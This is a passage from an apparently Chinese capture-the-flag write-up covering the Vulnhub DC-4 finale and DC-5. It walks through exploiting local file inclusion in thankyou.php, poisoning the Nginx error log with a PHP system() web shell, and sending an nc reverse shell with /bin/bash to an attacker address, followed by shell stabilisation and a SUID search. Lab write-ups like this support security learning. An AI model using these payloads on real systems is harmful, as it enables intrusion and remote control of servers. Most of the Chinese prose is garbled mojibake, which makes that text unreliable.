<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="line"></span><br><span class="line">æ„æ€æ˜¯</span><br><span class="line">æ­å–œï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">å¸Œæœ›ä½ å–œæ¬¢ DC-4ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢</span><br><span class="line">è°æä¾›äº†åé¦ˆï¼Œè°èŠ±æ—¶é—´å®Œæˆäº†è¿™äº›å°äº‹</span><br><span class="line">æŒ‘æˆ˜ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡ã€‚</span><br></pre></td></tr></table></figure></div>

<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1 id="äº”ã€DC-5-ä¸­çº§-é«˜çº§"><a href="#äº”ã€DC-5-ä¸­çº§-é«˜çº§" class="headerlink" title="äº”ã€DC-5[ä¸­çº§/é«˜çº§]"></a>äº”ã€DC-5[ä¸­çº§/é«˜çº§]</h1><p><strong>only one flag</strong></p>
<p>å®˜æ–¹æ–‡æ¡£é‡Œæœ‰ä¸€äº›æç¤ºè¯´æ˜ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">As</span> far <span class="keyword">as</span> I am aware, there <span class="keyword">is</span> <span class="keyword">only</span> one exploitable entry <span class="type">point</span> <span class="keyword">to</span> <span class="keyword">get</span> <span class="keyword">in</span> (there <span class="keyword">is</span> <span class="keyword">no</span> SSH either). This particular entry <span class="type">point</span> may be quite hard <span class="keyword">to</span> identify, but it <span class="keyword">is</span> there. You need <span class="keyword">to</span> look <span class="keyword">for</span> something a little <span class="keyword">out</span> <span class="keyword">of</span> the ordinary (something that changes <span class="keyword">with</span> a <span class="keyword">refresh</span> <span class="keyword">of</span> a page). This will hopefully provide <span class="keyword">some</span> kind <span class="keyword">of</span> idea <span class="keyword">as</span> <span class="keyword">to</span> what the vulnerability might involve.</span><br><span class="line"></span><br><span class="line"><span class="keyword">And</span> just <span class="keyword">for</span> the <span class="type">record</span>, there <span class="keyword">is</span> <span class="keyword">no</span> phpmailer exploit involved. :-)</span><br><span class="line">ç¿»è¯‘ï¼š</span><br><span class="line">æ®æˆ‘æ‰€çŸ¥ï¼Œåªæœ‰ä¸€ä¸ªå¯åˆ©ç”¨çš„å…¥å£ç‚¹å¯ä»¥è¿›å…¥ï¼ˆä¹Ÿæ²¡æœ‰ SSHï¼‰ã€‚è¿™ä¸ªç‰¹å®šçš„å…¥å£ç‚¹å¯èƒ½å¾ˆéš¾è¯†åˆ«ï¼Œä½†å®ƒå°±åœ¨é‚£é‡Œã€‚æ‚¨éœ€è¦å¯»æ‰¾ä¸€äº›ä¸ä¼—ä¸åŒçš„ä¸œè¥¿ï¼ˆéšç€é¡µé¢çš„åˆ·æ–°è€Œæ”¹å˜çš„ä¸œè¥¿ï¼‰ã€‚è¿™æœ‰æœ›ä¸ºæ¼æ´å¯èƒ½æ¶‰åŠçš„å†…å®¹æä¾›æŸç§æƒ³æ³•ã€‚</span><br><span class="line"></span><br><span class="line">åªæ˜¯ä¸ºäº†è®°å½•ï¼Œæ²¡æœ‰æ¶‰åŠ phpmailer æ¼æ´åˆ©ç”¨ã€‚:-)</span><br><span class="line"></span><br><span class="line">==&gt;å¤§è‡´å…³é”®çš„ä¿¡æ¯å°±æ˜¯ï¼Œåœ¨æˆ‘ä»¬åˆ·æ–°ç½‘é¡µçš„æ—¶å€™æœ‰çš„ä¸œè¥¿ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå¯¹åº”æŸç§æ¼æ´</span><br></pre></td></tr></table></figure></div>

<p>å…»æˆä¹ æƒ¯ï¼Œå…ˆé¡ºæ‰‹ç”¨<code>nmap</code>æ‰«ä¸€ä¸‹é¶æœºç«¯å£è¿è¡Œçš„æœåŠ¡ä¿¡æ¯</p>
<p><img src="/2022/08/29/vulnhub/image-20220923214221504.png" alt="image-20220923214221504"></p>
<p>å‘ç°<code>80</code>ç«¯å£æ­£å¸¸è¿è¡Œç€<code>http</code>ï¼Œ<code>54235</code>ç«¯å£æ‰“å¼€</p>
<hr>
<p>æˆ‘ä»¬è®¿é—®<code>192.168.133.143</code></p>
<p>å…ˆä¹ æƒ¯çœ‹çœ‹<code>Wappalyzer</code>åŸºæœ¬ä¿¡æ¯</p>
<p><img src="/2022/08/29/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p>
<p>å‘ç°<code>Web server</code>æ˜¯<code>Nginx</code></p>
<p>å‘ç°æœ‰5ä¸ªçª—å£</p>
<p><img src="/2022/08/29/vulnhub/image-20220930190329914.png" alt="image-20220930190329914"></p>
<p>æŒ¨ä¸ªè®¿é—®ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨æˆ–è€…äº¤äº’çš„åœ°æ–¹</p>
<p><img src="/2022/08/29/vulnhub/image-20220930185231350.png" alt="image-20220930185231350"></p>
<p><img src="/2022/08/29/vulnhub/image-20220930191004048.png" alt="image-20220930191004048"></p>
<p>å‘ç°<code>Concat</code>çª—å£ä¸‹æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œå¯ä»¥å®ç°äº¤äº’æ•ˆæœï¼Œæˆ‘ä»¬ä¹±è¾“å…¥ä¸€äº›æ•°æ®å…ˆè¯•è¯•</p>
<p>çœ‹çœ‹å˜åŒ–</p>
<p><img src="/2022/08/29/vulnhub/image-20220930191023866.png" alt="image-20220930191023866"></p>
<p>å‘ç°<code>url</code>åœ¨æäº¤æ—¶å‘ç”Ÿçš„è·³è½¬ï¼Œå¹¶ä¸”æ˜¾ç¤ºäº†ä¸€äº›ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.143</span>/thankyou.php?firstname=<span class="number">1</span>&amp;lastname=<span class="number">2</span>&amp;country=australia&amp;subject=<span class="number">123</span></span><br></pre></td></tr></table></figure></div>

<p>çœ‹å¾—å‡ºæ¥ï¼Œç½‘ç«™è·³è½¬åˆ°äº†<code>thankyou.php</code>ï¼Œè€Œä¸”æˆ‘ä»¬è¾“å…¥çš„ä¿¡æ¯ä¹Ÿè¢«ä»¥æ˜æ–‡æ–¹å¼æ˜¾ç¤ºå‡ºæ¥äº†</p>
<p>é‚£æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æƒ³èµ·ä¹‹å‰ä½œè€…ç»™çš„æç¤ºï¼Œè¯´<strong>åˆ·æ–°çš„æ—¶å€™ä¼šå‘ç”Ÿå˜åŒ–</strong>ï¼Œæˆ‘ä»¬åˆ·æ–°çœ‹çœ‹</p>
<p><img src="/2022/08/29/vulnhub/image-20220930191944460.png" alt="image-20220930191944460"></p>
<p><img src="/2022/08/29/vulnhub/image-20220930191958402.png" alt="image-20220930191958402"></p>
<p>å¯¹æ¯”ä¸¤ä¸ªå›¾å¯ä»¥å‘ç°ï¼Œåº•ä¸‹çš„å¹´ä»½æ—¶é—´å‘ç”Ÿäº†æ”¹å˜ï¼Œ<strong>åˆ·æ–°ä¸€æ¬¡ï¼Œå¢åŠ ä¸€å¹´</strong></p>
<p>è¿™ä¸ªè‚¯å®šæ˜¯æœ‰ç”¨çš„ï¼Œä½†æ˜¯æ€ä¹ˆåˆ©ç”¨è¿˜æ˜¯ä¸çŸ¥é“</p>
<p>æˆ‘ä»¬å…ˆè¦äº†è§£è¿™ä¸ªå˜åŒ–è‚¯å®šæ˜¯æœ‰æ–‡ä»¶æ¥è°ƒç”¨çš„ï¼Œè€Œæˆ‘ä»¬è‚¯å®šæ˜¯å¯ä»¥è®¿é—®è¿™ä¸ªæ–‡ä»¶çš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦å†æ¬¡é’ˆå¯¹æ€§çš„è¿›è¡Œä¿¡æ¯æ”¶é›†</p>
<p>ç”¨ç»å…¸çš„<code>dirsearch</code>æ¥æ‰«ä¸€ä¸‹</p>
<p><img src="/2022/08/29/vulnhub/image-20220930193121068.png" alt="image-20220930193121068"></p>
<p>é™¤å»æˆ‘ä»¬å·²ç»è®¿é—®è¿‡çš„æ–‡ä»¶å’Œå“åº”ç 403çš„ï¼Œå‘ç°æœ‰ä¸€ä¸ªå«åš<code>footer.php</code>æ–‡ä»¶ï¼Œåˆšå¥½å’Œæˆ‘ä»¬çš„å‘ç°å˜åŒ–çš„é‚£ä¸ªåœ°æ–¹ä¸€è‡´ï¼Œä¹Ÿæ˜¯<code>åº•éƒ¨æ–‡æœ¬</code>å˜åŒ–</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/footer.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220930193446746.png" alt="image-20220930193446746"></p>
<p>å‘ç°æœç„¶æ˜¯æˆ‘ä»¬å‘ç°å˜åŒ–çš„é‚£ä¸ªåœ°æ–¹ï¼Œè€Œä¸”æˆ‘ä»¬åˆ·æ–°æ—¶ï¼Œä¹Ÿä¼šåŒæ—¶å˜åŒ–</p>
<hr>
<h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>æ‰€ä»¥æŒ‰ä¸Šé¢æˆ‘ä»¬æ¨åˆ°çš„æ€è·¯ï¼Œå’Œä¿¡æ¯çš„æ”¶é›†ï¼Œ</p>
<p><code>concat.php</code>çš„åº•éƒ¨ä¸ºäº†æ˜¾ç¤ºå’Œ<code>footer.php</code>çš„å®ç°åŠŸèƒ½ï¼Œè‚¯å®šæ˜¯å®ç°äº†æ–‡ä»¶åŒ…å«ï¼Œ</p>
<p><code>concat.php</code>æŠŠ<code>footer.php</code>æ–‡ä»¶åŒ…å«äº†</p>
<p>==&gt;æˆ‘ä»¬æ¸—é€çš„åŸºç¡€æ€è·¯å°±å˜æˆäº†<strong>åˆ©ç”¨çš„æ–‡ä»¶åŒ…å«   æ‹¿åˆ°shell</strong></p>
<h3 id="1-éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•"><a href="#1-éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•" class="headerlink" title="1.éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•"></a>1.éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•</h3><p>ã€æ–‡ä»¶åŒ…å«ä¸€èˆ¬å˜é‡ä¸ºfileï¼Œå½“ç„¶å¦‚æœå‡ºç°æ€ä¹ˆéƒ½ä¸è¡Œçš„ï¼Œé‚£å°±å¯ä»¥ç”¨<code>çˆ†ç ´</code>**(fuzz)**æˆ–è€…æˆ‘ä»¬çš„æ€è·¯é”™è¯¯äº†ã€‘</p>
<p>æˆ‘ä»¬å…ˆè¯•è¯•èƒ½ä¸èƒ½åŒ…å«<code>index.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/thankyou.php?file=index.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220930194734246.png" alt="image-20220930194734246"></p>
<p>å‘ç°<code>index.php</code>ç¡®å®è¢«æˆ‘ä»¬æˆåŠŸåŒ…å«äº†ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥è‚¯å®šæˆ‘ä»¬çš„æ€è·¯æ˜¯æ²¡æœ‰åç¦»äº†</p>
<h3 id="2-åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell"><a href="#2-åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell" class="headerlink" title="2.åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell"></a>2.åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell</h3><p>æ—¢ç„¶èƒ½å¤Ÿåœ¨<code>thank.php</code>é‡Œå®ç°æ–‡ä»¶åŒ…å«ï¼Œé‚£æˆ‘ä»¬å°±è¯•è¯•èƒ½ä¸èƒ½åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œæ¥è·å–æ›´å¤šä¿¡æ¯</p>
<h4 id="1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ"><a href="#1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ" class="headerlink" title="1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ"></a>1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ</h4><p>æ ¹æ®æˆ‘ä»¬ä¹‹å‰æ”¶é›†çš„ä¿¡æ¯ï¼Œ</p>
<p><img src="/2022/08/29/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p>
<p>å‘ç°<code>Web server</code>æ˜¯<code>Nginx</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">Nginxè®¿é—®æ—¥å¿—ï¼šç½‘ç«™è®¿é—®è€…æœ‰å…³çš„æ´»åŠ¨éƒ½è®°å½•åœ¨è®¿é—®æ—¥å¿— <span class="regexp">//</span>access_log</span><br><span class="line"></span><br><span class="line">Nginxé”™è¯¯æ—¥å¿—ï¼šå½“è®¿é—®é”™è¯¯çš„æ—¶å€™ï¼Œä¼šæŠŠé”™è¯¯å‚æ•°ä¿å­˜åœ¨å…¶ä¸­  <span class="regexp">//</span>error_log</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥æˆ‘ä»¬åœ¨æˆ‘ä»¬çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">url/?<span class="built_in">file</span>= çš„åé¢åŠ ä¸Šä¸€å¥è¯ğŸï¼Œ</span><br><span class="line">ç„¶åå› ä¸ºè®¿é—®é”™è¯¯ï¼Œé”™è¯¯å‚æ•°ã€ä¸€å¥è¯ğŸã€‘å°±ä¼šåˆ°nginxçš„é”™è¯¯æ—¥å¿—ä¸­ï¼Œ</span><br><span class="line">ç„¶ååˆ©ç”¨æˆ‘ä»¬å‘ç°çš„æ–‡ä»¶åŒ…å«æŠŠé”™è¯¯æ—¥è®°åŒ…å«åœ¨thankyou.phpæ–‡ä»¶ä¸­ï¼Œ</span><br><span class="line">è®¿é—®æ‹¿åˆ°<span class="built_in">shell</span>ï¼Œæ‹¿åˆ°<span class="built_in">shell</span></span><br></pre></td></tr></table></figure></div>



<p><em><code>nginx</code>é…ç½®æ–‡ä»¶ä½ç½®ï¼š</em><em>/etc/nginx/nginx.conf</em>*</p>
<p>æˆ‘ä»¬åŒ…å«è¯¥æ–‡ä»¶çœ‹çœ‹<strong>nginxçš„é”™è¯¯æ—¥å¿—æ–‡ä»¶</strong>ä½ç½®åœ¨å“ªé‡Œ</p>
<p><img src="/2022/08/29/vulnhub/image-20220930212030059.png" alt="image-20220930212030059"></p>
<p>çœ‹åˆ°æ–‡ä»¶ä½ç½®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">error_logï¼š<span class="regexp">/var/</span>log<span class="regexp">/nginx/</span>error.log</span><br></pre></td></tr></table></figure></div>



<p>å…ˆè¾“å…¥ä¸€å¥è¯ğŸï¼ŒæŠ¥é”™å¯¼å…¥<code>nginx</code>é”™è¯¯æ—¥å¿—</p>
<hr>
<p><strong>key</strong>ï¼šå¦‚æœç›´æ¥åœ¨ç½‘é¡µè¾“å…¥ä¸€å¥è¯ğŸå¯¼å…¥é”™è¯¯æ—¥å¿—æ˜¯æœ‰é—®é¢˜çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">å½“æˆ‘ä»¬è®¿é—®http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/thankyou.php?file=&lt;?php system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br><span class="line"></span><br><span class="line">è™½ç„¶ç¡®å®æŠŠè¿™ä¸ªä¿¡æ¯å¯¼å…¥åˆ°äº† <span class="regexp">/var/</span>log<span class="regexp">/nginx/</span>error.log æ–‡ä»¶é‡Œ</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯å‰ç«¯ä¼¼ä¹å­˜åœ¨è¿‡æ»¤ï¼Œä¼šæŠŠ&lt;&gt;å’Œ<span class="string">&#x27;&#x27;</span>æˆ–<span class="string">&quot;&quot;</span>ï¼Œæ›¿æ¢æˆå…¶ä»–ç¬¦å·ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æƒ³è¦åˆ©ç”¨</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span><span class="regexp">/thankyou.php?file=/</span>var<span class="regexp">/log/</span>nginx/error.log&amp;cmd=ls</span><br><span class="line"></span><br><span class="line">è¿™æ ·æƒ³åˆ©ç”¨æˆ‘ä»¬å¯¼å…¥çš„æœ¨é©¬æ‹¿åˆ°shellçš„æ—¶å€™ï¼Œå®é™…ä¸Šæˆ‘ä»¬çš„æœ¨é©¬å·²ç»è¢«ç ´åäº†ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä¸€ç³»åˆ—å‘½ä»¤ï¼Œæ‰€ä»¥ç”¨æŠ“åŒ…burpç›´æ¥å‘é€åˆ°æœåŠ¡å™¨ï¼Œç»•è¿‡å‰ç«¯è¿‡æ»¤å…ˆï¼Œè¿™æ ·æˆ‘ä»¬çš„ä¸€å¥è¯ğŸæ‰èƒ½å‘æŒ¥å®ƒçš„ä½œç”¨</span><br></pre></td></tr></table></figure></div>

<hr>
<p>æ‰€ä»¥æˆ‘ä»¬æ‰§è¡Œ<strong>æŠ“åŒ…æ“ä½œ</strong></p>
<p><img src="/2022/08/29/vulnhub/image-20221001221200987.png" alt="image-20221001221200987"></p>
<p>æ²¡æœ‰å…¶ä»–å›æ˜¾å†…å®¹</p>
<p><img src="/2022/08/29/vulnhub/image-20221001221849004.png" alt="image-20221001221849004"></p>
<p>æˆ‘ä»¬åœ¨æ–‡ä»¶åŒ…å«<code>/var/log/nginx/error.log</code>ï¼Œå¹¶åˆ©ç”¨<code>cmd</code>å‚æ•°æ‰§è¡Œ<code>ls</code>è¯•è¯•ï¼Œçœ‹çœ‹æ˜¯å¦çœŸçš„æŠŠæˆ‘ä»¬çš„æœ¨é©¬åŒ…å«è¿›å»äº†</p>
<p><img src="/2022/08/29/vulnhub/image-20221001222035413.png" alt="image-20221001222035413"></p>
<p>å‘ç°ç¡®å®æˆåŠŸåŒ…å«è¿›å»äº†ï¼Œè€Œä¸”è¿˜å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<p>é‚£æˆ‘ä»¬ç›´æ¥ç”¨<code>nc</code>å‘½ä»¤åå¼¹<code>shell</code></p>
<h4 id="2ï¼‰ncå‘½ä»¤åå¼¹shell"><a href="#2ï¼‰ncå‘½ä»¤åå¼¹shell" class="headerlink" title="2ï¼‰ncå‘½ä»¤åå¼¹shell"></a>2ï¼‰ncå‘½ä»¤åå¼¹shell</h4><p>å…ˆåœ¨<code>kali</code>æ§åˆ¶å°æ‰§è¡Œ<code>nc</code>ç›‘å¬<code>8888</code>ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -l -vv -p <span class="number">8888</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221001223417288.png" alt="image-20221001223417288"></p>
<p>ç„¶åç½‘é¡µæµè§ˆ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.144</span><span class="regexp">/thankyou.php?file=/</span>var<span class="regexp">/log/</span>nginx<span class="regexp">/error.log&amp;cmd=nc%20-nv%20192.168.133.140%208888%20-e%20/</span>bin/bash</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.140</span>æ˜¯è™šæ‹Ÿæœºipï¼Œä¸æ˜¯é¶æœºip</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221001223100801.png" alt="image-20221001223100801"></p>
<p>è¿”å›æ§åˆ¶å°æŸ¥çœ‹</p>
<p><img src="/2022/08/29/vulnhub/image-20221001223320410.png" alt="image-20221001223320410"></p>
<p>è¿›å…¥<code>shell</code></p>
<p>ç„¶åæ ‡å‡†å§¿åŠ¿ï¼Œè¿›å…¥äº¤äº’å¼shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221001223408282.png" alt="image-20221001223408282"></p>
<h4 id="è·å¾—ç¨³å®šçš„shell"><a href="#è·å¾—ç¨³å®šçš„shell" class="headerlink" title="*è·å¾—ç¨³å®šçš„shell"></a>*è·å¾—ç¨³å®šçš„shell</h4><p>ã€ä¸ä¼šå› ä¸ºctrl+cé€€å‡ºï¼Œè€Œä¸”å¯ä»¥æŒ‰ä¸Šä¸‹é”®ï¼Œè¿”å›ä¹‹å‰çš„å‘½ä»¤ã€‘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">å…ˆåœ¨shellï¼Œç”¨Ctrl-Zå°†shellæ”¾åˆ°åå°</span><br><span class="line"></span><br><span class="line">å†</span><br><span class="line">stty raw -echo ; fg ; reset  </span><br><span class="line"></span><br><span class="line">  nc -l -vv -p <span class="number">8888</span>  <span class="regexp">//</span>è¿™ä¸ªä¸ç”¨è¾“å…¥ï¼Œæ˜¯è‡ªåŠ¨æ‰§è¡Œåå°çš„å‘½ä»¤è¿”å›åˆ°å‰å°</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>stty è®¾ç½®ç»ˆç«¯ç«¯å£è®¾å¤‡çš„æ¥å£é€‰é¡¹</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>echo è¡¨ç¤ºå›æ˜¾ï¼Œæ¯”å¦‚å½“-echoæ—¶ï¼Œè¾“å…¥lsåæŒ‰å›è½¦ï¼Œä»ç„¶ä¼šçœ‹åˆ°ls</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>fgæŠŠshellæåˆ°å‰å°æ¥</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>resetè¡¨ç¤ºé‡å¯ç»ˆç«¯ï¼Œæ­¤æ—¶çš„ç»ˆç«¯ä¸ºæˆ‘ä»¬é¶æœºçš„shellçª—å£ï¼Œæ‰€ä»¥ä¸å®¹æ˜“è¢«é€€å‡ºæˆ–è€…ä¸­æ–­</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221002145951718.png" alt="image-20221002145951718"></p>
<p>æˆåŠŸè·å¾—å…¨äº¤äº’å¼<code>shell</code></p>
<h3 id="3-ææƒ"><a href="#3-ææƒ" class="headerlink" title="3.ææƒ"></a>3.ææƒ</h3><p>æ‹¿åˆ°shellä»¥åï¼Œæˆ‘ä»¬æƒé™æ˜æ˜¾æ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦<strong>å‚ç›´ææƒ</strong>ï¼Œæ‹¿åˆ°æœ€é«˜æƒé™</p>
<p>å…ˆçœ‹çœ‹å­˜ä¸å­˜åœ¨<code>suid</code>æ–¹å¼ææƒ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20221001223927542.png" alt="image-20221001223927542"></p>
<p>ä¼¼ä¹æ²¡å•¥å¯ä»¥åˆ©ç”¨ææƒçš„ç‚¹ï¼Œä½†æ˜¯æœ‰ä¸ª</p>
<p><img src="/2022/08/29/vulnhub/image-20221001224134569.png" alt="image-20221001224134569"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>screen-<span class="number">4.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p>çœ‹èµ·æ¥æœ‰ç‚¹é™Œç”Ÿï¼Œæˆ‘ä»¬<code>ç™¾åº¦/google</code>å°±è¦åˆ©ç”¨èµ·æ¥äº†</p>
